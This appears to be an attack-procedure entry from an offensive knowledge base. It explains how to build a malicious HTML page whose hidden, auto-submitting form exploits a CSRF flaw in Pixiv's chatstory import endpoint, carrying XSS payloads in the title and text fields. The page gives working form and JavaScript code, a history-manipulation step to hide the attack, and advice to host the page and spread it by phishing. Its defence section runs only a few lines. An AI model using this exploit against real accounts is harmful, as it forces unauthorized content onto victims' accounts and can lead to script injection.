---
tags:
  - csrf
  - html-form
  - xss
  - pixiv
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:49.787Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: c1486f5d-4add-4614-aaba-dddc05678add
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Craft-CSRF-HTML-Form-for-Pixiv-Import

## Summary

This procedure guides the creation of a malicious HTML page with an auto-submitting form to exploit Pixiv's CSRF vulnerability, forcing unauthorized chatstory imports with potential XSS payloads.

## Description

Using the analyzed parameters, the attacker builds an HTML form that POSTs to the vulnerable endpoint when loaded in the victim's browser. Hidden inputs replicate the import data, including attacker novel ID and XSS-laden text/title. JavaScript auto-submits the form and may push a state to history for stealth. Host on an external site and distribute via phishing. Outcome: Victim's account imports the content without consent.

## Requirements

1. Knowledge of HTML and JavaScript
2. Hosting service for the malicious page (e.g., free web host)
3. Novel ID and parameters from prior analysis

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens and validate referer/origin headers
- Sanitize imported content to prevent XSS
- Educate users on phishing and unexpected imports

## Objectives

1. Forge import request to create unauthorized chatstory
2. Embed XSS for potential code execution post-import
3. Achieve stealth via history manipulation

## Instructions

### Step 1: Create HTML Form Structure

**Context**: Build the base form with hidden inputs for all parameters.

Create file malicious-import.html:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrfForm" action="https://chatstory.pixiv.net/imported" method="POST">
<input type="hidden" name="id" value="10997105">
<input type="hidden" name="text" value="test<script>alert(1)</script>">
<input type="hidden" name="comment" value="comment">
<input type="hidden" name="title" value="Malicious <script>alert(1)</script>">
<input type="hidden" name="user_id" value="39570048">
<input type="hidden" name="x_restrict" value="0">
<input type="hidden" name="is_original" value="true">
<input type="hidden" name="tags" value="#test">
</form>
</body>
</html>
```

### Step 2: Add Auto-Submit JavaScript

**Context**: Ensure form submits automatically on page load.

Add to <body>:

```html
<script>document.getElementById('csrfForm').submit();</script>
```

For stealth, add: <script>window.history.pushState({}, '', '/legit-page');</script>

### Step 3: Host and Test

**Context**: Deploy and verify the attack in an authenticated session.

Upload to a host (e.g., GitHub Pages), visit in authenticated Pixiv browser, confirm import occurs.

**Expected Output**: Chatstory imported under victim's account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[xss]]
